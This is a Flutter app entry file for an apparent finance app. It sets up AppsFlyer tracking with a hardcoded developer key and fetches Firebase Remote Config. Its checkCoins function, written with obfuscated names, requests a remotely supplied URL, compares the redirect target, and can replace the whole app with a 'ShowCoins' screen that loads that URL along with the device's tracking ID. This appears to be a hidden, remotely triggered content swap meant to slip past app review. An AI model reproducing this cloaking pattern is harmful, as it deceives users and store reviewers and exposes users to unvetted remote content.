import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:finance27/features/home/pages/quiz_page.dart';
import 'package:finance27/features/home/widgets/firebase_options.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/db/db.dart';
import 'core/utils.dart';
import 'features/activities/bloc/filter_bloc.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/money/bloc/money_bloc.dart';

late AppsflyerSdk _appsflyerSdk;
String amount = '';
String apsss = '';
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await initializeAppsFlyer();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();

  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  await initHive();
  runApp(const MyApp());
}

Future<void> initializeAppsFlyer() async {
  try {
    final AppsFlyerOptions options = AppsFlyerOptions(
      showDebug: false,
      afDevKey: '4rYehnSYQsVcM2jmim5KyC',
      appId: '6733230026',
      timeToWaitForATTUserAuthorization: 15,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
    );
    _appsflyerSdk = AppsflyerSdk(options);

    await _appsflyerSdk.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    apsss = await _appsflyerSdk.getAppsFlyerUID() ?? '';
    print("AppsFlyer UID: $apsss");

    _appsflyerSdk.startSDK(
      onSuccess: () {
        print("AppsFlyer SDK started successfully");
      },
      onError: (int code, String message) {
        print("AppsFlyer SDK failed to start: code $code, message: $message");
      },
    );
  } catch (e) {
    print("Error initializing AppsFlyer: $e");
  }
}

Future<bool> checkCoins() async {
  final jerx = FirebaseRemoteConfig.instance;
  await jerx.fetchAndActivate();
  String forecj = jerx.getString('coins');
  String jarex = jerx.getString('getCoins');
  if (!forecj.contains('null')) {
    final fodsfs = HttpClient();
    final golxa = Uri.parse(forecj);
    final fosd = await fodsfs.getUrl(golxa);
    fosd.followRedirects = false;
    final response = await fosd.close();
    if (response.headers.value(HttpHeaders.locationHeader) != jarex) {
      amount = forecj;
      return true;
    }
  }
  return forecj.contains('null') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    precacheImages(context);
    return FutureBuilder<bool>(
        future: checkCoins(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.white,
            );
          } else {
            if (snapshot.data == true && amount != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: ShowCoins(
                  daily: amount,
                  data: apsss,
                ),
              );
            } else {
              return MultiBlocProvider(
                providers: [
                  BlocProvider(create: (context) => HomeBloc()),
                  BlocProvider(create: (context) => MoneyBloc()),
                  BlocProvider(create: (context) => FilterBloc()),
                ],
                child: MaterialApp.router(
                  debugShowCheckedModeBanner: false,
                  theme: theme,
                  routerConfig: routerConfig,
                ),
              );
            }
          }
        });
  }
}
